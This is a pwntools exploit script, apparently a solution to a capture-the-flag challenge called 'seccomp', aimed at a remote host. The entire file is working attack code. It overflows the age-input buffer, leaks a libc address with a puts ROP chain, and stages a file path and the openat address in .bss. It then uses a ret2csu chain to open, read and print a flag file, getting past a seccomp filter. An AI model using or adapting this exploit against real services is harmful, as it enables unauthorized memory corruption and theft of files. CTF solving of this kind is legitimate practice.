from pwn import *

#p = process('./seccomp')
p =remote('211.239.124.246', 12403)
e = ELF('./seccomp')
#l = e.libc
l = ELF('./libc.so.6')

pause()
context.log_level = "debug"

### libc leak
p.sendlineafter('Input your age : ', '1')

payload = 'a' * 0x110
payload += 'b' * 8

p_rdi_r = 0x0000000000400eb3
main = 0x400A96

payload += p64(p_rdi_r)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(main)

p.send(payload)

libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - l.sym['puts']
log.info('libc : ' + hex(libc))
###################
### /home/seccomp/flag
p.sendlineafter('Input your age : ', '1')

payload = 'a' * 0x110
payload += 'b' * 8

p_rsi_r15_r = 0x0000000000400eb1

payload += p64(p_rdi_r)
payload += p64(0)
payload += p64(p_rsi_r15_r)
payload += p64(e.bss() + 0x100)
payload += p64(100)
payload += p64(e.plt['read'])
payload += p64(main)

p.send(payload)

log.info('bss + 0x100 : ' + hex(e.bss() + 0x100))
p.sendline('/home/seccomp/flag\x00')
#p.sendline('/home/youngsouk/pwn/how_old_are_you/flag')
### write openat addr
payload = 'a' * 0x110
payload += 'b' * 8

p_rsi_r15_r = 0x0000000000400eb1

payload += p64(p_rdi_r)
payload += p64(0)
payload += p64(p_rsi_r15_r)
payload += p64(e.bss() + 0x50)
payload += p64(100)
payload += p64(e.plt['read'])
payload += p64(main)

p.sendlineafter('Input your age : ', '1')
p.send(payload)
p.sendline(p64(libc + l.sym['openat']))
######################
### openat - csu init
csu_1 = 0x400EAA
csu_2 = 0x400E90

payload = 'a' * 0x110
payload += 'b' * 8

payload += p64(csu_1)
payload += p64(0)
payload += p64(1)
payload += p64(e.bss() + 0x50)
payload += p64(0)
payload += p64(e.bss() + 0x100)
payload += p64(6)
payload += p64(csu_2)
payload += p64(main) * 8

pause()
p.sendlineafter('Input your age : ', '1')
p.send(payload)
#######################
### read flag
payload = 'a' * 0x110
payload += 'b' * 8


payload += p64(p_rdi_r)
payload += p64(3)
payload += p64(p_rsi_r15_r)
payload += p64(e.bss() + 0x200)
payload += p64(100)
payload += p64(e.plt['read'])
payload += p64(main)

pause()
p.sendlineafter('Input your age : ', '1')
p.send(payload)
###########################
### puts flag
payload = 'a' * 0x110
payload += 'b' * 8

payload += p64(p_rdi_r)
payload += p64(e.bss() + 0x200)
payload += p64(e.plt['puts'])
payload += p64(main)

p.sendlineafter('Input your age : ', '1')
p.send(payload)
########################

p.interactive()
